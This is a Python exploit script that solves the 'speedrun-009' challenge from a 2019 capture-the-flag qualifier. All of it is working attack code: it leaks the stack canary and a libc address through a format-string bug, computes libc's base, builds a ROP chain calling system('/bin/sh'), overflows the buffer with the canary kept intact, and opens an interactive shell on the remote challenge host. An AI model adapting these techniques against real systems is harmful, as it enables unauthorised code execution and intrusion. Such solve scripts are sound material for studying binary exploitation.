#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './speedrun-009'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'speedrun-009.quals2019.oooverflow.io', 'port':31337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    sr = SpeedRun09(conn)

    leak = map(lambda x : int(x, 16), sr.fsb('%163$p %169$p\x00').split())

    canary = leak[0]
    info('canary            = 0x{:08x}'.format(canary))

    addr_libc_main  = leak[1] - 0xe7
    libc.address    = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    rop = ROP(libc)
    rop.call(rop.ret)
    rop.system(addr_libc_str_sh)

    exploit  = 'a'*0x408
    exploit += p64(canary)
    exploit += p64(0xdeadbeef)
    exploit += str(rop)
    sr.bof(exploit)

    conn.sendafter('1, 2, or 3', '3')
    
class SpeedRun09:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def bof(self, data):
        self.sendafter('1, 2, or 3', '1')
        self.send(data)

    def fsb(self, data):
        self.sendafter('1, 2, or 3', '2')
        self.send(data)
        self.recvuntil('it "')
        return self.recvuntil('"?', drop=True)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
